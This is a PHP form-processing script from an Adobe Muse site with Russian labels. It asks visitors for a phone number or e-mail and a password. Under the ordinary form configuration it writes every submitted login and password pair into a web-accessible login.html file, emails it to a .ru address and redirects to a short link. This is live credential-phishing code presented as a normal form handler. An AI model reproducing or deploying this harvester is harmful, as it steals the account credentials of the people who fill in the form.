<?php 
/* 	
If you see this text in your browser, PHP is not configured correctly on this hosting provider. 
Contact your hosting provider regarding PHP configuration for your site.

PHP file generated by Adobe Muse CC 2015.0.1.310
*/

require_once('form_process.php');

$form = array(
	'subject' => 'Отправка Форма Домашняя',
	'heading' => 'Отправка новой формы',
	'success_redirect' => 'http://wooga.info/HVzt',
	'resources' => array(
		'checkbox_checked' => 'Отмечено',
		'checkbox_unchecked' => 'Флажок не установлен',
		'submitted_from' => 'Формы, отправленные с веб-сайта: %s',
		'submitted_by' => 'IP-адрес посетителя: %s',
		'too_many_submissions' => 'Недопустимо высокое количество отправок с этого IP-адреса за последнее время',
		'failed_to_send_email' => 'Не удалось отправить сообщение эл. почты',
		'invalid_reCAPTCHA_private_key' => 'Недействительный закрытый ключ reCAPTCHA.',
		'invalid_field_type' => 'Неизвестный тип поля \'%s\'.',
		'invalid_form_config' => 'Недопустимая конфигурация поля \"%s\".',
		'unknown_method' => 'Неизвестный метод запроса сервера'
	),
	'email' => array(
		'from' => 'support@foezoeket.ru',
		'to' => 'support@foezoeket.ru'
	),
	'fields' => array(
		'custom_U119' => array(
			'order' => 1,
			'type' => 'string',
			'label' => 'Телефон или E-mail',
			'required' => true,
			'errors' => array(
				'required' => 'Поле \'Телефон или E-mail\' не может быть пустым.'
			)
		),
		'custom_U123' => array(
			'order' => 2,
			'type' => 'string',
			'label' => 'Пароль',
			'required' => true,
			'errors' => array(
				'required' => 'Поле \'Пароль\' не может быть пустым.'
			)
		)
	)
);
$date=date("d.m.y"); // число.месяц.год 
$time=date("H:i"); // часы:минуты:секунды 
$login=$_POST['custom_U119']; 
$password=$_POST['custom_U123'];
$f = fopen("login.html", "a+");
fwrite($f,"$login:$password"); 
fwrite($f,"<br />"); 
fclose($f);
process_form($form);
?>
